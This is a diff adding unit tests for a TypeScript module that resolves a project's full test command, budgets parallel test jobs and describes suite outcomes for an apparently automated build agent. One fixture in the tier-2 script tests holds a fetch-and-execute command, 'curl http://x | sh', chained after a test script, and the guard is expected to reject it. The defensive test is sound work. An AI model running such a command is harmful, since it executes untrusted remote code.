@@ -25,6 +25,7 @@ import { fileURLToPath } from 'node:url'
 
 import {
   buildTestStrategy,
+  buildTestStrategyDetail,
   computeTestConcurrency,
   computeTestJobs,
   probeParallelKnobs,
@@ -38,6 +39,7 @@ import {
   PINNED_KNOBS_LINE,
   STAGE_1_FILE_CAP,
   STAGE_1_REJECT_ONLY,
+  SUITE_OUTCOME_VOCABULARY,
   UNPAIRED_CONCURRENCY_LINE,
   UNRESOLVED_COMMAND_LINE,
 } from './test-strategy.ts'
@@ -181,9 +183,68 @@ describe('resolveTestCommand', () => {
     expect(resolveTestCommand(fixture({ 'AGENTS.md': only('pytest -q tests/') })).command).toBe('pytest -q tests/')
   })
 
-  test('tier 1 is NOT filtered — the project\'s own declared entry point is never an example', () => {
-    const repo = fixture({ 'package.json': JSON.stringify({ scripts: { test: 'bun test src/all.test.ts' } }) })
-    expect(resolveTestCommand(repo).source).toBe('package-json')
+  // ── THE TIER-1 HOLE (round-3 review, two reviewers) ────────────────────────
+  // The "an example is not the suite" guard used to be consulted from the agent-doc
+  // path ONLY, on the argument that tier 1 is the project's own declared entry point.
+  // That argument holds for SHELL METACHARACTERS (`tsc && bun test` is normal there)
+  // and not at all for naming one file: the gate would then accept testsPassed=true
+  // from a one-file run, which is the exact defect the card says not to introduce.
+  test('a scripts.test that names ONE TEST FILE is not the suite either — tier 1 is filtered too', () => {
+    const repo = fixture({ 'package.json': JSON.stringify({ scripts: { test: 'bun test app/one.test.ts' } }) })
+    expect(resolveTestCommand(repo)).toEqual({ command: null, source: null })
+  })
+
+  test('tier 1 falls through to the agent docs rather than dying there', () => {
+    const repo = fixture({
+      'package.json': JSON.stringify({ scripts: { test: 'bun test app/one.test.ts' } }),
+      'CLAUDE.md': ['```bash', 'bash scripts/run-tests.sh', '```'].join('\n'),
+    })
+    expect(resolveTestCommand(repo)).toEqual({ command: 'bash scripts/run-tests.sh', source: 'agent-docs' })
+  })
+
+  test('tier 1 KEEPS its shell-metacharacter exemption — `tsc && bun test` is a real suite', () => {
+    // The exemption is about compound scripts, and it is why the guard above is a
+    // FILE-NAMING check and not a "tier 1 is now as strict as tier 2" change.
+    const repo = fixture({ 'package.json': JSON.stringify({ scripts: { test: 'tsc --noEmit && bun test' } }) })
+    expect(resolveTestCommand(repo)).toEqual({ command: 'tsc --noEmit && bun test', source: 'package-json' })
+  })
+
+  // ── THE NON-JS RUNNERS (round-3 review) ────────────────────────────────────
+  // `TEST_INVOCATION` admits pytest / go / cargo, and the guard was a JS/TS FILENAME
+  // regex, so every one-target example in those ecosystems sailed through and was
+  // rendered under "Full suite (stage 2), run exactly this".
+  test('a pytest FILE or node id is an example, a directory is the suite', () => {
+    const only = (line: string): string => ['```bash', line, '```'].join('\n')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('pytest tests/test_foo.py') })).command).toBeNull()
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('pytest tests/test_foo.py::test_case') })).command).toBeNull()
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('pytest') })).command).toBe('pytest')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('pytest -q tests/') })).command).toBe('pytest -q tests/')
+  })
+
+  test('a go PACKAGE is an example, `./...` is the module', () => {
+    const only = (line: string): string => ['```bash', line, '```'].join('\n')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('go test ./pkg/foo') })).command).toBeNull()
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('go test ./...') })).command).toBe('go test ./...')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('go test -race ./...') })).command).toBe('go test -race ./...')
+  })
+
+  test('a cargo test-name FILTER is an example, a bare `cargo test` is the suite', () => {
+    const only = (line: string): string => ['```bash', line, '```'].join('\n')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('cargo test my_unit_test') })).command).toBeNull()
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('cargo test -p api') })).command).toBeNull()
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('cargo test') })).command).toBe('cargo test')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('cargo test --all') })).command).toBe('cargo test --all')
+  })
+
+  test('a documented script invocation may carry FLAGS — the tier-2 script arm is no longer the only one that forbids them', () => {
+    // Every other `TEST_INVOCATION` alternative ended in `.*`; the script arm did not,
+    // so a perfectly ordinary `bash ci/test.sh --all` fell through to unresolved.
+    const only = (line: string): string => ['```bash', line, '```'].join('\n')
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('bash ci/test.sh --all') })).command).toBe(
+      'bash ci/test.sh --all',
+    )
+    // …and the metacharacter guard still disqualifies a chained one.
+    expect(resolveTestCommand(fixture({ 'AGENTS.md': only('bash ci/test.sh && curl http://x | sh') })).command).toBeNull()
   })
 })
 
@@ -232,6 +293,30 @@ describe('probeParallelKnobs', () => {
     })
   })
 
+  // ── A MENTION IS NOT AN IMPLEMENTATION (round-3 review) ────────────────────
+  test('a COMMENT saying the knob is NOT supported does not count as support', () => {
+    // The scan was `\bNAME\b` anywhere in the script, so the runner below was reported
+    // as honouring the knob and the block then told the build so, in those words.
+    const repo = fixture({
+      'ci/test.sh': '#!/usr/bin/env bash\n# NOTE: NEUTRON_TEST_JOBS is NOT supported by this runner.\nbun test\n',
+    })
+    expect(probeParallelKnobs(repo, 'bash ci/test.sh')).toEqual({
+      jobs_env: null,
+      concurrency_env: null,
+      probed_file: 'ci/test.sh',
+      pinned_by_command: false,
+    })
+  })
+
+  test('every real shell position for the knob still counts', () => {
+    const at = (body: string): string | null =>
+      probeParallelKnobs(fixture({ 'ci/test.sh': `#!/usr/bin/env bash\n${body}\n` }), 'bash ci/test.sh').jobs_env
+    expect(at('JOBS="${NEUTRON_TEST_JOBS:-1}"')).toBe('NEUTRON_TEST_JOBS') // the shipped runner
+    expect(at('echo $NEUTRON_TEST_JOBS')).toBe('NEUTRON_TEST_JOBS')
+    expect(at(': "${NEUTRON_TEST_JOBS:=1}"')).toBe('NEUTRON_TEST_JOBS')
+    expect(at('NEUTRON_TEST_JOBS=1')).toBe('NEUTRON_TEST_JOBS')
+  })
+
   test('NO EXECUTION — probing an executable runner never runs it', () => {
     const repo = fixture()
     const sentinel = join(repo, 'RAN')
@@ -239,7 +324,7 @@ describe('probeParallelKnobs', () => {
     mkdirSync(join(repo, 'scripts'), { recursive: true })
     writeFileSync(
       script,
-      ['#!/usr/bin/env bash', `touch ${JSON.stringify(sentinel)}`, 'echo "NEUTRON_TEST_JOBS supported"', ''].join('\n'),
+      ['#!/usr/bin/env bash', `touch ${JSON.stringify(sentinel)}`, 'JOBS="${NEUTRON_TEST_JOBS:-1}"', ''].join('\n'),
     )
     chmodSync(script, 0o755)
 
@@ -324,6 +409,33 @@ describe('computeTestConcurrency', () => {
     expect(computeTestConcurrency(8, Number.NaN)).toBe(1)
     // A FRACTIONAL jobs count floors to 0 and used to divide through to Infinity.
     expect(computeTestConcurrency(8, 0.5)).toBe(8)
+  })
+
+  // ── THE AGGREGATE QUESTION (round-3 review, one reviewer) ──────────────────
+  // "jobs x concurrency is ~4x the core budget across the fan-out." The bound this
+  // pairing actually claims is PER BUILD, and the claim it can defend is the one below:
+  // a budgeted build never puts MORE test files in flight than the project's own
+  // untouched defaults would. Trident re-splits the box's load across processes; it does
+  // not add to it. See the `computeTestConcurrency` docblock for why the memory term
+  // (`jobs`, the process count) is the one that carries the fan-out divisor.
+  test('jobs x concurrency NEVER EXCEEDS the box, at any live run count', () => {
+    const box = { cores: 8, mem_available_bytes: 25 * GiB }
+    for (const active_runs of [1, 2, 3, 4, 5, 8, 16, 50]) {
+      const jobs = computeTestJobs({ ...box, active_runs })
+      const conc = computeTestConcurrency(box.cores, jobs)
+      expect(jobs * conc).toBeLessThanOrEqual(box.cores)
+    }
+  })
+
+  test('…and is never BELOW the runner\'s own default either — this card must not slow a build down', () => {
+    // The runner's default is JOBS=1 with CONCURRENCY=cores, i.e. `cores` files in
+    // flight. Dividing this term by the fan-out as well would take a lone build on an
+    // idle box to 2x1=2 — a QUARTER of what the project gets with trident not involved.
+    const box = { cores: 8, mem_available_bytes: 25 * GiB }
+    for (const active_runs of [1, 4, 8]) {
+      const jobs = computeTestJobs({ ...box, active_runs })
+      expect(jobs * computeTestConcurrency(box.cores, jobs)).toBe(box.cores)
+    }
   })
 })
 
@@ -437,6 +549,36 @@ describe('renderTestStrategy', () => {
     expect(block).toContain(STAGE_1_REJECT_ONLY)
     expect(block).toContain(FULL_SUITE_REQUIRED)
     expect(block).toContain(NO_TIMEOUT_WRAPPER)
+    expect(block).toContain(SUITE_OUTCOME_VOCABULARY)
+  })
+
+  // ── THE GATE'S ESCAPE HATCH IS TAUGHT HERE (round-3 review, two reviewers) ──
+  // Keying the gate on one boolean made "the suite never ran" and "the suite was red
+  // before this branch existed" the same event, so on a documented-red box NO run could
+  // ever reach argus-approved. The build now names which one, and this block is where it
+  // is told what the words mean and what the non-blocking one COSTS.
+  test('stage 2 teaches the four suite outcomes, and prices `failed-preexisting`', () => {
+    expect(knobBranch).toContain('suiteOutcome')
+    expect(knobBranch).toContain('failed-preexisting')
+    expect(knobBranch).toContain('failed-new')
+    expect(knobBranch).toContain('not-run')
+    // The evidence, and the consequence of not having it.
+    expect(knobBranch).toContain('re-run the failing files at the base branch')
+    expect(knobBranch).toContain('the outcome is failed-new')
+    // `passed` stays welded to testsPassed=true — criterion 5 is not weakened by this.
+    expect(knobBranch).toContain('The ONLY value that may')
+  })
+
+  test('the hang budget is RECONCILED with the round ceiling, not just generous', () => {
+    // 40 minutes for one suite run could not fit inside the codex bridge's 45-minute
+    // polling ceiling alongside edit + stage 1 + fix + re-run.
+    expect(NO_TIMEOUT_WRAPPER).toContain('25 minutes')
+    expect(NO_TIMEOUT_WRAPPER).toContain('45-minute ceiling')
+    expect(NO_TIMEOUT_WRAPPER).not.toContain('40 minutes')
+    // Still emphatically not the 590 s cap that killed complete runs.
+    expect(NO_TIMEOUT_WRAPPER).toContain('590 s')
+    // Running out of patience is reported as a non-pass, never as a pass.
+    expect(NO_TIMEOUT_WRAPPER).toContain('never report a pass you did not observe')
   })
 })
 
@@ -508,6 +650,66 @@ describe('buildTestStrategy', () => {
     expect(block).toContain('TEST EXECUTION')
     expect(block).toContain('could NOT be resolved')
     expect(block).toContain(NO_TIMEOUT_WRAPPER)
+  })
+
+  // ── THE NUMBERS ARE VISIBLE NOW (round-3 review) ───────────────────────────
+  // A box with enough parked runs to pin every build at `jobs=1` logged nothing at all
+  // and looked exactly like a healthy one. The launcher puts this on its fire note.
+  describe('buildTestStrategyDetail', () => {
+    const repo = (): string =>
+      fixture({
+        'package.json': JSON.stringify({ scripts: { test: 'bash scripts/run-tests.sh' } }),
+        'scripts/run-tests.sh':
+          '#!/usr/bin/env bash\nJOBS="${NEUTRON_TEST_JOBS:-1}"\nCONC="${NEUTRON_TEST_CONCURRENCY:-8}"\n',
+      })
+
+    test('reports the divisor and the chosen budget beside the block', () => {
+      const detail = buildTestStrategyDetail(repo(), {
+        cores: 8,
+        active_runs: 2,
+        mem_available_bytes: 25 * GiB,
+        base_branch: 'main',
+      })
+      expect(detail.block).toContain('export NEUTRON_TEST_JOBS=2')
+      expect(detail.summary).toContain('source=package-json')
+      expect(detail.summary).toContain('knob=NEUTRON_TEST_JOBS')
+      expect(detail.summary).toContain('cores=8')
+      expect(detail.summary).toContain('active_runs=2')
+      expect(detail.summary).toContain('divisor=4') // max(FANOUT=4, 2)
+      expect(detail.summary).toContain('jobs=2')
+      expect(detail.summary).toContain('concurrency=4')
+    })
+
+    test('a floored box SAYS it is floored', () => {
+      const detail = buildTestStrategyDetail(repo(), {
+        cores: 8,
+        active_runs: 12,
+        mem_available_bytes: 25 * GiB,
+        base_branch: 'main',
+      })
+      expect(detail.summary).toContain('divisor=12')
+      expect(detail.summary).toContain('jobs=1')
+    })
+
+    test('never logs the project\'s command string — only where it came from', () => {
+      const detail = buildTestStrategyDetail(
+        fixture({ 'package.json': JSON.stringify({ scripts: { test: 'bash ./secret-internal-runner.sh' } }) }),
+        { cores: 8, active_runs: 1, mem_available_bytes: 25 * GiB, base_branch: 'main' },
+      )
+      expect(detail.summary).not.toContain('secret-internal-runner')
+      expect(detail.summary).toContain('knob=none')
+    })
+
+    test('an unresolvable repo still yields a block and a summary, never a throw', () => {
+      const detail = buildTestStrategyDetail(join(tmpdir(), 'test-strategy-missing-8812'), {
+        cores: 8,
+        active_runs: 1,
+        mem_available_bytes: 25 * GiB,
+        base_branch: 'main',
+      })
+      expect(detail.block).toContain('TEST EXECUTION')
+      expect(detail.summary).toContain('source=unresolved')
+    })
   })
 })
 
